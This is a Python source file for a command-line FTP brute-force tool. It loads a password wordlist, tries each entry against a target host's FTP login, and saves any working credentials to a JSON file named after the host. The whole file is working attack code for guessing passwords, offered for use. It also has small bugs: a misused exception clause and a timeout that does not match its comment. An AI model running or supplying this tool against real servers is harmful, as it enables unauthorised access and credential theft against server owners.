from ftplib import FTP, error_perm
from colorama import Fore, init
from json import dumps as tojson
from os import system as terminal
from os import mkdir
from sys import argv as path
from func import logo
from prettytable import PrettyTable as table
init(autoreset=True)
terminal('cls')
# __colors__
g = Fore.GREEN
r = Fore.RED
w = Fore.WHITE
y = Fore.YELLOW
try:
    if path[1] == '-h':
        logo()
        exit()
    print(f'\n [{g}*{w}] Load Data...\n')
    username = path[path.index('-u')+1] if path[path.index('-u')+1] else 'admin'
    passwords = path[path.index('--pass')+1]
    if passwords:
        passwords = open(passwords).read().split('\n')
    else:
        print(f'\n [{r}!{w}] Password List Is Undifind!')
    host = path[-1]
    port = path[path.index('-p')+1]
    timeout = 3000 # 3 secs
except ValueError or IndexError as e:
    print(f'\n [{r}!{w}] Check Your Commend Again, Some Value May Not Set!\n     Use \"{g}-h{w}\"\n     {r}Error{w}:\n           {g}{e}')
    exit()
data = table([f'{g}UserName{w}', f'{g}Passwords{w}', f'{g}Domain{w}', f'{g}Port{w}'])
data.add_row([f'{y}{username}{w}', f'{y}{len(passwords)} Loaded{w}', f'{y}{host}{w}', f'{y}{port}{w}'])
print(data)
input('\n   Press Enter')
del data
terminal('cls')
for pw in passwords:
    target = FTP()
    try:
        target.connect(host, int(port), timeout=timeout)
    except ConnectionRefusedError:
        print(f'\n [{r}!{w}] Connection Refused: Connecton Is Break Or Its May Your Ip Is Blocked From Server.')
        exit()
    except TimeoutError:
        print(f'\n [{r}!{w}] TimeOut: Connecton Is To Slow ({timeout}ms)')
        exit()
    except EOFError:
        pass
    try:
        print(f'\n [{g}*{w}] Test Password: {y+pw}') # you can comment it to dontc show passwords who in testing
        target.login(username, pw)
    except error_perm:
        pass
    else:
        terminal('cls')
        print(f'\n [{g}*{w}] Password Is: > {g+pw+w} <')
        data = {"domain": f"{host}","port": f"{port}","user": f"{username}","pass": f"{pw}"}
        try:
            mkdir('servers') #make folder servers
            with open(f'servers/{host}.json', 'w', encoding='utf-8') as file:
                file.write(tojson(data, indent=4))
                file.close()
        except Exception as e:
            print('Can\'t Save Data Becuz: ', e)
print(f'\n [{r} END {w}]')
exit(0)
